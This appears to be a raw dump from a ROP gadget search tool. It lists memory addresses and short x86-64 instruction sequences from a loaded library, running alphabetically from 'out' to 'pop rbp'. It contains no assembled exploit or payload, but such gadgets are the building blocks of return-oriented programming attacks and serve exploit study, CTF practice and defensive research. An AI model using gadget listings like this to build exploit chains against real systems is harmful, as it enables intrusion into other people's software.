0x00002aaaaac7aa62 : out dx, al ; jmp rdx
0x00002aaaaac5bd2e : out dx, al ; jmp rsp
0x00002aaaaaad8795 : out dx, al ; jne 0x3775 ; ret 0x975
0x00002aaaaabc7b96 : out dx, al ; jno 0xf2bad ; add byte ptr [rax + 0x63], cl ; or al, 0x8a ; add rdx, rcx ; jmp rdx
0x00002aaaaac6c0ea : out dx, al ; lcall ptr [rcx + 0x6a440000] ; out dx, al ; jmp rsp
0x00002aaaaac5b976 : out dx, al ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaab81127 : out dx, al ; lea r9, qword ptr [rsp + 0x20] ; lea rcx, qword ptr [rax + 4] ; call rbx
0x00002aaaaac6c212 : out dx, al ; ljmp ptr [rdi + 0x7cd40000] ; out dx, al ; jmp rsp
0x00002aaaaaad8183 : out dx, al ; mov eax, 0xa1a3e95a ; ret 0xba88
0x00002aaaaabe8e6e : out dx, al ; mov edx, dword ptr [rdi + 0x28] ; xor eax, eax ; test edx, edx ; sete al ; ret
0x00002aaaaac2704a : out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac0f8e2 : out dx, al ; mov rdi, rbp ; mov edx, 0xffffffff ; xor eax, eax ; call rcx
0x00002aaaaabc40f4 : out dx, al ; mov rdi, rbx ; call 0x3b3c6
0x00002aaaaab91e79 : out dx, al ; mov rdi, rbx ; call 0x89166
0x00002aaaaab5a0cf : out dx, al ; mov rdi, rbx ; call rax
0x00002aaaaac2f60a : out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaab804f9 : out dx, al ; nop word ptr [rax + rax] ; ret
0x00002aaaaac1f88e : out dx, al ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaabaeb45 : out dx, al ; or byte ptr [rcx - 0x77], al ; ret 0xff25
0x00002aaaaab637e4 : out dx, al ; or eax, dword ptr [rax] ; ret
0x00002aaaaac5b972 : out dx, al ; push qword ptr [rcx + rbx*2 - 0x12] ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaac6c2aa : out dx, al ; push qword ptr [rsi + rbp*8 - 0x260c0000] ; out dx, al ; call rsp
0x00002aaaaabb83fe : out dx, al ; ret
0x00002aaaaaad75b2 : out dx, al ; ret 0x88ad
0x00002aaaaac5d2dc : out dx, al ; sal ebx, 1 ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaab9c90d : out dx, al ; xor edx, edx ; jmp 0xc78d9
0x00002aaaaab7f3dd : out dx, eax ; adc byte ptr [rax + 1], cl ; clc ; ret
0x00002aaaaabd5f3d : out dx, eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab9468f : out dx, eax ; add cl, byte ptr [rax - 0x46] ; ret
0x00002aaaaac8ef1d : out dx, eax ; add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac2aa50 : out dx, eax ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab53cd7 : out dx, eax ; add ecx, dword ptr [rax - 0x77] ; ret 0xcf31
0x00002aaaaac447dd : out dx, eax ; add r8b, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac0eb9c : out dx, eax ; add rbx, r12 ; call r14
0x00002aaaaac46f7d : out dx, eax ; add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaabc8456 : out dx, eax ; call 0xef753
0x00002aaaaabcfaf2 : out dx, eax ; call 0xf6d03
0x00002aaaaac0275f : out dx, eax ; call qword ptr [rbx]
0x00002aaaaac7bd52 : out dx, eax ; call qword ptr [rdi]
0x00002aaaaabf436f : out dx, eax ; call r12
0x00002aaaaab0e1ad : out dx, eax ; call r14
0x00002aaaaab0c348 : out dx, eax ; call r15
0x00002aaaaabf1306 : out dx, eax ; call rax
0x00002aaaaab816e7 : out dx, eax ; call rbx
0x00002aaaaac103a2 : out dx, eax ; call rcx
0x00002aaaaac02256 : out dx, eax ; call rdx
0x00002aaaaac6c452 : out dx, eax ; call rsp
0x00002aaaaac5e1f8 : out dx, eax ; cmc ; call qword ptr [rdi]
0x00002aaaaabff4a6 : out dx, eax ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac09195 : out dx, eax ; dec dword ptr [rax - 0x77] ; ret 0x8d48
0x00002aaaaac091d4 : out dx, eax ; dec dword ptr [rax - 0x77] ; ret 0xbfeb
0x00002aaaaabff44e : out dx, eax ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + 0x31], 0xc0 ; pop rbx ; ret
0x00002aaaaac6c59a : out dx, eax ; dec esp ; add al, byte ptr [rcx] ; add ah, dl ; mov ebp, edi ; jmp rsp
0x00002aaaaac6c5e2 : out dx, eax ; dec esp ; add eax, dword ptr [rcx] ; add byte ptr [rdx + rdx*4], al ; out dx, eax ; jmp rsp
0x00002aaaaac5b1c5 : out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5b1c9 : out dx, eax ; in eax, dx ; inc dword ptr [rcx] ; out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac5b1cd : out dx, eax ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac6c6c2 : out dx, eax ; inc dword ptr [rax + rcx - 0x4cbffff] ; out dx, eax ; call rsp
0x00002aaaaac6c55a : out dx, eax ; inc esp ; add dword ptr [rcx], eax ; add byte ptr [rcx + rax*4], dh ; out dx, eax ; jmp rsp
0x00002aaaaac5c2e1 : out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac5c2e5 : out dx, eax ; int1 ; jmp qword ptr [rax]
0x00002aaaaac7e6f9 : out dx, eax ; int1 ; jmp rcx
0x00002aaaaab71e11 : out dx, eax ; jmp 0x9c7bb
0x00002aaaaab7284b : out dx, eax ; jmp 0x9c843
0x00002aaaaac5be2e : out dx, eax ; jmp qword ptr [rax + 0x24]
0x00002aaaaac5bdf2 : out dx, eax ; jmp qword ptr [rax]
0x00002aaaaac7c06a : out dx, eax ; jmp qword ptr [rbx]
0x00002aaaaac00998 : out dx, eax ; jmp qword ptr [rsi + 0xf]
0x00002aaaaac5be0e : out dx, eax ; jmp rsi
0x00002aaaaac6c3b2 : out dx, eax ; jmp rsp
0x00002aaaaac5be06 : out dx, eax ; lcall ptr [rax - 0x23] ; out dx, eax ; lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaac5be0a : out dx, eax ; lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaac6c612 : out dx, eax ; lcall ptr [rsp + rax + 1] ; add byte ptr [rsp + rdx*4], dh ; out dx, eax ; call rsp
0x00002aaaaac00ed6 : out dx, eax ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac0f89b : out dx, eax ; mov edx, 0xffffffff ; xor eax, eax ; call r8
0x00002aaaaac0f8e5 : out dx, eax ; mov edx, 0xffffffff ; xor eax, eax ; call rcx
0x00002aaaaab91e5d : out dx, eax ; mov esi, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac26e7a : out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac26f76 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac26ec2 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab1db80 : out dx, eax ; mov rax, rdx ; ret
0x00002aaaaabe97f0 : out dx, eax ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaac09fcb : out dx, eax ; mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaac06b93 : out dx, eax ; mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac0699b : out dx, eax ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaabfee2f : out dx, eax ; mov rcx, r13 ; call rbx
0x00002aaaaab0c8b5 : out dx, eax ; mov rdx, rbp ; call r15
0x00002aaaaac2f68a : out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaab61976 : out dx, eax ; mul byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaaad72db : out dx, eax ; or bl, byte ptr [rbx + 0x38] ; ja 0xffffffffd6104b6f ; ret
0x00002aaaaac1f98d : out dx, eax ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac487bc : out dx, eax ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaab59e14 : out dx, eax ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac48609 : out dx, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp 0x1f8b1
0x00002aaaaab47cc1 : out dx, eax ; pop rbx ; ret
0x00002aaaaac6c3aa : out dx, eax ; push qword ptr [rdi + rsi*8 + 0x1f940000] ; out dx, eax ; jmp rsp
0x00002aaaaac428e3 : out dx, eax ; push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac428f8 : out dx, eax ; push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac4290d : out dx, eax ; push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab7f268 : out dx, eax ; ret
0x00002aaaaac0034d : out dx, eax ; ret 0
0x00002aaaaab7e6f3 : out dx, eax ; ret 0xf66
0x00002aaaaac43dfc : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x00002aaaaac43de5 : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x00002aaaaac43dce : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x00002aaaaac4288a : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac42b5f : out dx, eax ; xchg eax, esi ; add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac42c1c : out dx, eax ; xchg eax, esi ; lock add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac42b7a : out dx, eax ; xchg eax, esi ; nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac42bcb : out dx, eax ; xchg eax, esi ; rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaabdeae9 : out dx, eax ; xor byte ptr [rcx], dh ; rol byte ptr [rbx - 0x69f0f601], 0xc0 ; ret
0x00002aaaaac01b5e : out dx, eax ; xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaab1d088 : out dx, eax ; xor eax, eax ; ret
0x00002aaaaac1b53e : outsb dx, byte ptr [rsi] ; adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac5ca72 : outsb dx, byte ptr [rsi] ; add dword ptr [rax - 0x78], esp ; jmp rdx
0x00002aaaaab93b41 : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; add bl, dh ; ret
0x00002aaaaabe0b0e : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac44d9e : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x00002aaaaac86d8d : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; nop ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac86dbd : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; shl byte ptr [rcx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaab87774 : outsb dx, byte ptr [rsi] ; add eax, dword ptr [rax] ; add al, ch ; ret
0x00002aaaaac33687 : outsb dx, byte ptr [rsi] ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab9da00 : outsb dx, byte ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaac84d39 : outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab09cbb : outsb dx, byte ptr [rsi] ; enter 0x280f, -0x3f ; ret
0x00002aaaaac5c00d : outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac5c009 : outsb dx, byte ptr [rsi] ; int1 ; inc eax ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac5c011 : outsb dx, byte ptr [rsi] ; int1 ; jmp rax
0x00002aaaaac5c005 : outsb dx, byte ptr [rsi] ; int1 ; push qword ptr [rax - 0x3f000e92] ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac59c83 : outsb dx, byte ptr [rsi] ; ja 0x184c0c ; ret 0x48f
0x00002aaaaaad75a9 : outsb dx, byte ptr [rsi] ; jo 0x25a3 ; scasd eax, dword ptr [rdi] ; xchg eax, esi ; add byte ptr [rdx], al ; xchg dh, ch ; ret 0x88ad
0x00002aaaaac6c121 : outsb dx, byte ptr [rsi] ; out dx, al ; call rsp
0x00002aaaaab938fe : outsb dx, byte ptr [rsi] ; ret 0xfffc
0x00002aaaaac579c4 : outsb dx, byte ptr [rsi] ; sahf ; ret 0x38ae
0x00002aaaaabca850 : outsb dx, byte ptr [rsi] ; std ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x00002aaaaaad866d : outsb dx, byte ptr [rsi] ; stosb byte ptr [rdi], al ; stc ; insb byte ptr [rdi], dx ; mov ebx, 0x952a6c41 ; ret
0x00002aaaaabd2908 : outsb dx, byte ptr [rsi] ; sub al, 0 ; mov rdx, rax ; jmp 0xfd8a4
0x00002aaaaab63baa : outsb dx, byte ptr [rsi] ; xor byte ptr [rbx + rcx*4 + 0x76], cl ; cmp byte ptr [rax + 0xf], cl ; ret
0x00002aaaaabde3ad : outsd dx, dword ptr [rsi] ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaac6aead : outsd dx, dword ptr [rsi] ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; mov ebp, ecx ; jmp rsp
0x00002aaaaab6b4fd : outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaac86e7d : outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; and byte ptr [rdx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaac86ec5 : outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86e95 : outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; cwde ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac86e4d : outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaabaa8cc : outsd dx, dword ptr [rsi] ; call 0xffffffffc2e1683d
0x00002aaaaac90379 : outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rax]
0x00002aaaaac90349 : outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac90469 : outsd dx, dword ptr [rsi] ; clc ; call rcx
0x00002aaaaabc86b0 : outsd dx, dword ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac84e29 : outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabe9a9d : outsd dx, dword ptr [rsi] ; fisub dword ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret 0x144
0x00002aaaaab5e338 : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x00002aaaaab6427e : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x00002aaaaabaa8c8 : outsd dx, dword ptr [rsi] ; fsub dword ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; call 0xffffffffc2e16841
0x00002aaaaaad7f95 : outsd dx, dword ptr [rsi] ; mov byte ptr [rbx], cl ; and bh, byte ptr [rax - 0x52] ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaac43bfd : outsd dx, dword ptr [rsi] ; push rdi ; ret
0x00002aaaaac43c9d : outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x00002aaaaab6197a : outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaab122fc : outsd dx, dword ptr [rsi] ; ret
0x00002aaaaabe9aa1 : outsd dx, dword ptr [rsi] ; ret 0x144
0x00002aaaaac58386 : outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x00002aaaaac277b7 : outsd dx, dword ptr [rsi] ; ret 0x8b4c
0x00002aaaaac43ca2 : outsd dx, dword ptr [rsi] ; ret 0xc2b2
0x00002aaaaabb5132 : outsd dx, dword ptr [rsi] ; ret 0xddeb
0x00002aaaaab619ca : outsd dx, dword ptr [rsi] ; ret 0xf66
0x00002aaaaabb5115 : outsd dx, dword ptr [rsi] ; ror byte ptr [rax - 0x7d], 1 ; ret 0x4101
0x00002aaaaac713c9 : outsd dx, dword ptr [rsi] ; std ; call qword ptr [rcx]
0x00002aaaaabd2872 : outsd dx, dword ptr [rsi] ; sub al, 0 ; add rsp, 8 ; ret
0x00002aaaaac58385 : outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00002aaaaac19182 : pcmpeqb mm0, mm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaab80042 : pcmpeqb mm1, qword ptr [rbx] ; mov eax, dword ptr [rdi + 0x28] ; cmp eax, dword ptr [rsi + 0x28] ; jne 0xab0bb ; ret
0x00002aaaaab80092 : pcmpeqb mm1, qword ptr [rbx] ; mov eax, dword ptr [rdi + 0x38] ; cmp eax, dword ptr [rsi + 0x38] ; jne 0xab0bb ; ret
0x00002aaaaab80068 : pcmpeqb mm2, qword ptr [rip + 0x3b30478b] ; xor byte ptr [rbp + 0x3d], r14b ; ret
0x00002aaaaab80384 : pcmpeqb mm3, qword ptr [rcx] ; add rax, 2 ; ret
0x00002aaaaab8036f : pcmpeqb mm3, qword ptr [rsi] ; ret
0x00002aaaaac19181 : pcmpeqb xmm0, xmm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac59785 : pcmpeqw mm5, qword ptr [rbp + r12*2 - 0x5f] ; mov cs, edi ; ret 0x8b36
0x00002aaaaac59786 : pcmpeqw mm5, qword ptr [rbp - 0x5f] ; mov cs, edi ; ret 0x8b36
0x00002aaaaab7e0d9 : pcmpgtd mm1, qword ptr [rcx - 0x12cff7a9] ; mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e077 : pcmpgtd mm1, qword ptr [rcx - 0x12cffba9] ; mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaab72df1 : pcmpgtd mm1, qword ptr [rcx - 0x76b7fba9] ; clc ; ret
0x00002aaaaab73465 : pcmpgtd mm1, qword ptr [rdi] ; xlatb ; ret 0xc085
0x00002aaaaab09b41 : pmovmskb eax, mm0 ; and eax, 0x80 ; ret
0x00002aaaaab09e71 : pmovmskb eax, mm0 ; and eax, 8 ; ret
0x00002aaaaab62ebc : pmovmskb eax, mm1 ; bsf eax, eax ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab73473 : pmovmskb eax, mm1 ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab62f64 : pmovmskb eax, mm1 ; test eax, eax ; jne 0x8dfca ; xor rax, rax ; ret
0x00002aaaaab73515 : pmovmskb eax, mm1 ; test eax, eax ; jne 0x9e599 ; xor eax, eax ; ret
0x00002aaaaab09b40 : pmovmskb eax, xmm0 ; and eax, 0x80 ; ret
0x00002aaaaab09e70 : pmovmskb eax, xmm0 ; and eax, 8 ; ret
0x00002aaaaab73472 : pmovmskb eax, xmm1 ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab62f63 : pmovmskb eax, xmm1 ; test eax, eax ; jne 0x8dfcb ; xor rax, rax ; ret
0x00002aaaaab73514 : pmovmskb eax, xmm1 ; test eax, eax ; jne 0x9e59a ; xor eax, eax ; ret
0x00002aaaaab5fb9f : pmovmskb edx, mm4 ; test edx, edx ; je 0x8abb3 ; bsf eax, edx ; ret
0x00002aaaaab5fb9f : pmovmskb edx, mm4 ; test edx, edx ; je 0x8abb4 ; bsf eax, edx ; ret
0x00002aaaaab5fb9e : pmovmskb edx, xmm4 ; test edx, edx ; je 0x8abb4 ; bsf eax, edx ; ret
0x00002aaaaab5fb9e : pmovmskb edx, xmm4 ; test edx, edx ; je 0x8abb5 ; bsf eax, edx ; ret
0x00002aaaaac78f25 : pop qword ptr [rax] ; add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaabb0305 : pop qword ptr [rsi - 0x77000000] ; ret 0xd139
0x00002aaaaabe94b5 : pop r10 ; ret
0x00002aaaaac59c0f : pop r10 ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00002aaaaab590fa : pop r12 ; jmp rax
0x00002aaaaab5af8c : pop r12 ; jmp rcx
0x00002aaaaabd6c8f : pop r12 ; mov esi, 2 ; jmp rax
0x00002aaaaabd6ca9 : pop r12 ; mov esi, 3 ; jmp rax
0x00002aaaaab44b6e : pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac4860c : pop r12 ; pop r13 ; jmp 0x1f8ae
0x00002aaaaab173cc : pop r12 ; pop r13 ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab1734a : pop r12 ; pop r13 ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd845b : pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf524f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf60fb : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaba1b02 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaaaf52e3 : pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab48630 : pop r12 ; pop r13 ; pop r14 ; sar rax, 2 ; ret
0x00002aaaaab42125 : pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaaaf56c2 : pop r12 ; pop r13 ; ret
0x00002aaaaab8aa24 : pop r12 ; pop r14 ; ret
0x00002aaaaab0e8c6 : pop r12 ; pop rbp ; ret
0x00002aaaaaaf4b12 : pop r12 ; ret
0x00002aaaaac4860e : pop r13 ; jmp 0x1f8ac
0x00002aaaaab173ce : pop r13 ; pop r14 ; fmul st(0) ; ret
0x00002aaaaab1734c : pop r13 ; pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd845d : pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf5251 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf60fd : pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaba1b04 : pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaaaf52e5 : pop r13 ; pop r14 ; ret
0x00002aaaaab48632 : pop r13 ; pop r14 ; sar rax, 2 ; ret
0x00002aaaaab42127 : pop r13 ; pop rbp ; ret
0x00002aaaaaaf56c4 : pop r13 ; ret
0x00002aaaaab173d0 : pop r14 ; fmul st(0) ; ret
0x00002aaaaab1734e : pop r14 ; fmulp st(1) ; ret
0x00002aaaaabd845f : pop r14 ; pop r15 ; jmp rax
0x00002aaaaaaf5253 : pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf60ff : pop r14 ; pop r15 ; ret
0x00002aaaaaba1b06 : pop r14 ; pop rbp ; ret
0x00002aaaaaaf52e7 : pop r14 ; ret
0x00002aaaaab48634 : pop r14 ; sar rax, 2 ; ret
0x00002aaaaabd8461 : pop r15 ; jmp rax
0x00002aaaaaaf5255 : pop r15 ; pop rbp ; ret
0x00002aaaaaaf6101 : pop r15 ; ret
0x00002aaaaac09c7d : pop r8 ; add al, byte ptr [rax] ; add byte ptr [rax], al ; add rdi, 0x58 ; jmp rcx
0x00002aaaaab5380c : pop r8 ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaac09546 : pop r8 ; mov eax, 1 ; ret
0x00002aaaaac68ab7 : pop r9 ; clc ; ret 0x6e1f
0x00002aaaaabc20af : pop rax ; adc byte ptr [rcx + rcx*4 + 0x78], al ; or byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac09c7e : pop rax ; add al, byte ptr [rax] ; add byte ptr [rax], al ; add rdi, 0x58 ; jmp rcx
0x00002aaaaab3f914 : pop rax ; add byte ptr [rax], al ; add rsp, 0xd8 ; ret
0x00002aaaaac75765 : pop rax ; add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaab32f1c : pop rax ; add byte ptr ss:[rax - 0x39], cl ; ret 0xfffe
0x00002aaaaac0bd97 : pop rax ; add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaac857ad : pop rax ; add dword ptr [rax], eax ; jo 0x1b073d ; cmc ; jmp rax
0x00002aaaaac02f86 : pop rax ; add rsp, 0x10 ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaac87078 : pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac09e44 : pop rax ; call rax
0x00002aaaaac69f99 : pop rax ; cld ; call qword ptr [rax + 0x10fffc57]
0x00002aaaaac69e19 : pop rax ; cld ; call rdx
0x00002aaaaac69f59 : pop rax ; cld ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac69f95 : pop rax ; cld ; jmp qword ptr [rax]
0x00002aaaaac69f55 : pop rax ; cld ; push qword ptr [rax] ; pop rax ; cld ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac84508 : pop rax ; cmc ; jmp rax
0x00002aaaaac82e48 : pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac5be08 : pop rax ; fucomp st(7) ; lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaac09c86 : pop rax ; jmp rcx
0x00002aaaaac853e8 : pop rax ; js 0x1b03e3 ; jmp qword ptr [rbx]
0x00002aaaaac72968 : pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac74f98 : pop rax ; mov dh, 0xeb ; jmp qword ptr [rax]
0x00002aaaaab5380d : pop rax ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaac09547 : pop rax ; mov eax, 1 ; ret
0x00002aaaaab02ef4 : pop rax ; mov eax, dword ptr [rax + rdi*4 + 0x200] ; ret
0x00002aaaaab02e82 : pop rax ; mov eax, dword ptr [rdx + rax*4 + 0x200] ; ret
0x00002aaaaac02bde : pop rax ; mov qword ptr [rdx + 0x68], rcx ; ret
0x00002aaaaab45e2a : pop rax ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd6408 : pop rax ; mov rax, rbx ; pop rdx ; pop rbx ; ret
0x00002aaaaabb955e : pop rax ; or bh, dh ; ret
0x00002aaaaab79114 : pop rax ; or dword ptr [rax], eax ; add cl, ch ; ret
0x00002aaaaaaf903f : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf492e : pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaabdb829 : pop rax ; pop rdi ; call rax
0x00002aaaaac179c1 : pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaab08544 : pop rax ; ret
0x00002aaaaac75888 : pop rax ; shr ah, 1 ; jmp rbx
0x00002aaaaac6ef39 : pop rax ; stc ; jmp rsp
0x00002aaaaaba5dc6 : pop rbp ; adc al, ch ; ret
0x00002aaaaabb2ed7 : pop rbp ; add al, 0x85 ; fisttp dword ptr [rcx + 0x7e10245c] ; ret 0x8b48
0x00002aaaaabb2d0d : pop rbp ; add byte ptr [rcx], al ; ret 0xda39
0x00002aaaaabed6c6 : pop rbp ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaabd623a : pop rbp ; add byte ptr [rcx], dh ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
